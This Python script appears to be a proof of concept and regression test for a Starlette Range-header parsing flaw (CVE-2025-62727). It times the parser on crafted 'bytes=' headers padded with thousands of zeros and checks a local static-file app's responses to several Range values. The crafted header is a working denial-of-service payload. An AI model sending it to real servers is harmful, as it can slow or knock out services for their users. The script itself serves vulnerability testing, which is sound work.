"""The CVE-2025-62727 PoC (GHSA-7f5h-v6xp-fcq8) and the RFC 9110 Range answers of #649, on the installed Starlette."""
import sys, time, warnings
warnings.simplefilter("ignore")
import starlette
from starlette.applications import Starlette
from starlette.responses import FileResponse
from starlette.routing import Mount
from starlette.staticfiles import StaticFiles
from starlette.testclient import TestClient

print("starlette", starlette.__version__)
for n in (2000, 4000, 8000, 16000):
    header = "bytes=" + "0" * n + "a-"
    times = []
    for _ in range(3):
        t = time.perf_counter()
        try:
            FileResponse._parse_range_header(header, 1_000_000)
        except Exception:
            pass
        times.append(time.perf_counter() - t)
    print(f"  parse n={n}: best of 3 {min(times):.6f} s")
c = TestClient(Starlette(routes=[Mount("/static", StaticFiles(directory=sys.argv[1]))]))
for rng in ("bytes=0-3", "bytes=100-", "bytes=0-1,4-5", "widgets=1-2", "bytes=x", "bytes=" + "0" * 16000 + "a-"):
    t = time.perf_counter()
    r = c.get("/static/b.js", headers={"Range": rng})
    dt = time.perf_counter() - t
    print(f"  GET Range {rng[:20]!r}: {r.status_code} {dt:.4f}s content-range={r.headers.get('content-range')!r} "
          f"content-type={r.headers.get('content-type')!r} crlf={b'\r\n' in r.content} body={r.content[:60]!r}")
